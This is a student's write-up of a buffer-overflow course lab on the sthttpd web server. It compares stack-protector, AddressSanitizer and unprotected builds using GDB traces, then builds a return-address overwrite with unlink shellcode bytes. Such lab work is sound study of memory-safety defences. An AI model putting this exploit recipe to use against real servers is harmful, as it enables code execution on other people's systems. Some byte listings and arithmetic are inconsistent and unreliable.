@@ -1,0 +1,312 @@
+Smashing lab
+605128830
+Beomjoo Kim
+
+
+
+1. setting PATH
+
+I used nano editor to set the PATH.
+after that, I used commands below
+
+echo $PATH
+which gcc
+
+to check if I'm in the right path.
+
+
+
+2. Download the source code and patch to the file
+
+I downloaded sthttpd file from cs33 fall 2018 website to my computer, and edited the source files to the given form.
+Then I moved it to my seasnet server using scp command
+
+scp sthttpd-2.27.0.tar.gz beomjoo@lnxsrv.seas.ucla.edu:
+
+then I decompressed the file.
+
+tar xvf sthttpd-2.27.0.tar.gz
+
+
+
+3. Compile
+
+I got into the sthttpd-2.27.0/ directory and did
+
+./configure LDFLAGS="-Xlinker --rpath=/usr/local/cs/gcc-$(gcc -dumpversion)/lib"
+
+and configured.
+then I compiled thttpd-sp, thttpd-no, thttpd-as by doing
+
+$ make clean
+$ make CFLAGS='-g3 -O2 -fno-inline -fstack-protector-strong'
+$ mv src/thttpd src/thttpd-sp
+
+$ make clean
+$ make CFLAGS='-g3 -O2 -fno-inline -fsanitize=address'
+$ mv src/thttpd src/thttpd-as
+
+$ make clean
+$ make CFLAGS='-g3 -O2 -fno-inline -fno-stack-protector -zexecstack'
+$ mv src/thttpd src/thttpd-no
+
+
+
+4. Test normal conditions & Run server(port for me: SP: 12427, AS: 12428, NO: 12429)
+
+I got into the src directory.
+
+I made foo.txt file, saying the program is running
+
+I ran servers by doing these commands.
+
+src/thttpd-sp -p 12427 -D
+src/thttpd-as -p 12428 -D
+src/thttpd-no -p 12429 -D
+
+and I checked all of them running without any problem with using
+
+$ curl http://localhost:12427/foo.txt
+$ curl http://localhost:12428/foo.txt    
+$ curl http://localhost:12429/foo.txt
+
+they all returned 'the program is running', without any error!
+
+
+
+
+5. Crash the variants and run GDB to find BT and the point of a crash.
+
+I first made a text file named bad.txt, containing more words than the program can contain.
+
+echo 'debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug debug' > bad.txt
+
+__case: SP__
+
+Then I ran GDB with thttpd-sp using
+
+r -p 12427 -D -C bad.txt
+
+then it said: *** stack smashing detected ***: ... terminated
+	      Program received signal SIGSEGV, Segmentation fault.
+
+(gdb) bt
+#0  0x000000332a00f867 in ?? () from /lib64/libgcc_s.so.1
+#1  0x000000332a010119 in _Unwind_Backtrace () from /lib64/libgcc_s.so.1
+#2  0x00000033244febd6 in backtrace () from /lib64/libc.so.6
+#3  0x00000033244703bb in __libc_message () from /lib64/libc.so.6
+#4  0x0000003324502807 in __fortify_fail () from /lib64/libc.so.6
+#5  0x00000033245027d0 in __stack_chk_fail () from /lib64/libc.so.6
+#6  0x000000000040433b in read_config (filename=<optimized out>)
+    at thttpd.c:1190
+#7  0x7562656400677562 in ?? ()
+#8  0x0067756265640067 in ?? ()
+#9  0x6564006775626564 in ?? ()
+#10 0x7562656400677562 in ?? ()
+#11 0x0067756265640067 in ?? ()
+#12 0x0000006775626564 in ?? ()
+#13 0x00007fffffffd0e0 in ?? ()
+#14 0x00007fffffffe300 in ?? ()
+#15 0x0000000000000000 in ?? ()
+
+From the result, we can see that the function at address 0x000000332a00f867 is overwritten by the file that we made, bad.txt.
+
+and it seems like the program is crashed at around line 1190 at thttpd.c.
+Thus we set
+
+break 1189.
+
+and then run GDB again.
+
+gdb thttpd-sp
+(gdb) break 1189
+(gdb) run -p 12427 -D -C bad.txt
+(gdb) set disassemble-next-line on
+(gdb) si
+0x0000000000404289	1189	    (void) fclose( fp );
+   0x0000000000404286 <read_config+1206>:	4c 89 e7	mov    %r12,%rdi
+=> 0x0000000000404289 <read_config+1209>:	e8 e2 e4 ff ff	callq  0x402770 <fclose@plt>
+(gdb) ni
+1190	    }
+=> 0x000000000040428e <read_config+1214>:	48 8b 44 24 68	mov    0x68(%rsp),%rax
+   0x0000000000404293 <read_config+1219>:	64 48 33 04 25 28 00 00 00	xor    %fs:0x28,%rax
+   0x000000000040429c <read_config+1228>:	0f 85 94 00 00 00	jne    0x404336 <read_config+1382>
+   0x00000000004042a2 <read_config+1234>:	48 83 c4 78	add    $0x78,%rsp
+   0x00000000004042a6 <read_config+1238>:	5b	pop    %rbx
+   0x00000000004042a7 <read_config+1239>:	5d	pop    %rbp
+   0x00000000004042a8 <read_config+1240>:	41 5c	pop    %r12
+   0x00000000004042aa <read_config+1242>:	41 5d	pop    %r13
+   0x00000000004042ac <read_config+1244>:	c3	retq 
+
+Now we can definitely see that xor is comparing canary values and they are not equal so the scope jump to callq right after. This is the part that calls function -stack-chk-fail() and ultimately aborts the program.
+
+
+
+6.
+__case: AS__
+
+I ran GDB with thttpd-as
+
+r -p 12428 -D -C bad.txt
+
+then I got: ==7741==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7fffffffceb4 at pc 0x425de8 bp 0x7fffffffce10 sp 0x7fffffffcde8
+
+I did bt again, but it says no stack.
+So I assume that the program already has detected the buffer-overflow and aborted already. The program checks shadow memories and call some functions if it detects a buffer-overflow.
+
+
+
+7. 
+
+__case: NO__
+
+I ran GDB with thttpd-no
+
+r -p 12429 -D -C bad.txt
+
+then I got: Using host libthread_db library "/lib64/libthread_db.so.1".
+Program received signal SIGSEGV, Segmentation fault.
+
+To check what happened, I did bt.
+
+and it shows:
+
+(gdb) bt
+#0  0x0000000000404128 in read_config (filename=<optimized out>)
+    at thttpd.c:1190
+#1  0x7562656400677562 in ?? ()
+#2  0x0067756265640067 in ?? ()
+#3  0x6564006775626564 in ?? ()
+#4  0x7562656400677562 in ?? ()
+#5  0x0067756265640067 in ?? ()
+#6  0x0000006775626564 in ?? ()
+#7  0x00007fffffffd0e0 in ?? ()
+#8  0x00007fffffffe300 in ?? ()
+#9  0x0000000000000000 in ?? ()
+
+The program aborts quickly and buffer-overflow has nothing to do with it.
+
+So I did the same thing that I did for SP. and got:
+
+(gdb) break 1189
+Breakpoint 1 at 0x404116: file thttpd.c, line 1189.
+(gdb) r -p 12429 -D -C bad.txt
+Starting program: /w/home.02/cs/ugrad/beomjoo/sthttpd-2.27.0/src/thttpd-no -p 12429 -D -C bad.txt
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib64/libthread_db.so.1".
+
+Breakpoint 1, read_config (filename=<optimized out>) at thttpd.c:1189
+1189	    (void) fclose( fp );
+(gdb) set disassemble-next-line on
+(gdb) si
+0x0000000000404119	1189	    (void) fclose( fp );
+   0x0000000000404116 <read_config+1190>:	4c 89 e7	mov    %r12,%rdi
+=> 0x0000000000404119 <read_config+1193>:	e8 ea e5 ff ff	callq  0x402708 <fclose@plt>
+(gdb) si
+0x0000000000402708 in fclose@plt ()
+=> 0x0000000000402708 <fclose@plt+0>:	ff 25 aa 1d 21 00	jmpq   *0x211daa(%rip)        # 0x6144b8 <fclose@got.plt>
+(gdb) ni
+0x000000000040270e in fclose@plt ()
+=> 0x000000000040270e <fclose@plt+6>:	68 56 00 00 00	pushq  $0x56
+(gdb) si
+0x0000000000402713 in fclose@plt ()
+=> 0x0000000000402713 <fclose@plt+11>:	e9 80 fa ff ff	jmpq   0x402198
+(gdb) si
+0x0000000000402198 in ?? ()
+=> 0x0000000000402198:	ff 35 5a 20 21 00	pushq  0x21205a(%rip)        # 0x6141f8
+(gdb) si
+0x000000000040219e in ?? ()
+=> 0x000000000040219e:	ff 25 5c 20 21 00	jmpq   *0x21205c(%rip)        # 0x614200
+
+
+Here, we can check that the program is aborted right after calling function fclose@plt. This means that it accessed an incorrect memory address and not checked or detected an overflow and just leaved it to happen.
+
+
+
+
+8. 
+
+I created the assembly files with following commands:
+
+make clean
+make CFLAGS='-S -O2 -fno-inline -fstack-protector-strong'
+mv thttpd.o thttpd-sp.s
+
+make clean
+make CFLAGS='-S -O2 -fno-inline -fsanitize=address'
+mv thttpd.o thttpd-as.s
+
+make clean
+make CFLAGS='-S -O2 -fno-inline -fno-stack-protector -zexecstack'
+mv thttpd.o thttpd-no.s
+
+From the result, we can definitely see that the assembly language of no and sp are same. The stack protector option only have canaries for local arrays while handle-read doesn't have one. as has the longest assembly languge, which is about twice as long as the other two. This is because it checks for the shadow memory and calls other functions when overflow happens.
+Also, -fstack-protector-strong option compares canary values and this leads to call a function whenever it detects an overflow.
+
+
+
+9.
+
+We need to find the address of line when the program runs.
+so we run the program with GDB and set a breat point at read_config.
+
+I first used execstack -s thttpd-no to change the executable file.
+
+execstack -s thttpd-no
+
+and I disabled randomization.
+
+(gdb) set disable-randomization
+
+(gdb) break read_config
+
+and run it with bad.txt
+
+then we get this:
+Breakpoint 1, read_config (filename=0x7fffffffe5eb "bad.txt")
+    at thttpd.c:1000
+1000	    {
+
+and print the address of the line:
+
+(gdb) print &line
+$1 = (char (*)[100]) 0x7fffffffcfc0
+
+We now need to find the address of a stack pointer.
+
+(gdb) info r $rsp
+rsp            0x7fffffffd058	0x7fffffffd058
+
+The difference between the stack pointer and the base of the buffer is
+
+- 0x7fffffffcfc0 + 0x7fffffffd058 = -140737488342976 + 140737488343128 = 152
+
+so we need to insert 152 char to reach the return address.
+
+we make a room for the rest of the stack by subtracting 16 and add 8 to the return addresss so that it could fit the form of hex given.
+
+so 0x7fffffffd058 - 16 = 0x7fffffffd048, 0x7fffffffcfc0 + 8 = 0x7fffffffcfc8
+
+Now we use command below:
+
+gcc -c unlink.s
+objdump -d unlink.o
+
+and we get:
+
+58 cf 48 df ff ff ff 	movabs $0x7fffffffcf48,%rdi
+8f 00 00
+58 d7 d0 67 00 00 00 	mov    $0x67,%rax
+0f 05 syscall
+
+we finally insert this code to exploit code:
+
+48 bf 38 cf ff ff ff 7f 00 00 48 c7 c0 57 00 00 00 0f 05
+
+Then I transferred it to the linux server and made target.txt to test the exploit.
+
+and I used a command below.
+
+(gdb) r -p 12429 -D -C target.txt
+
+YAS!!!
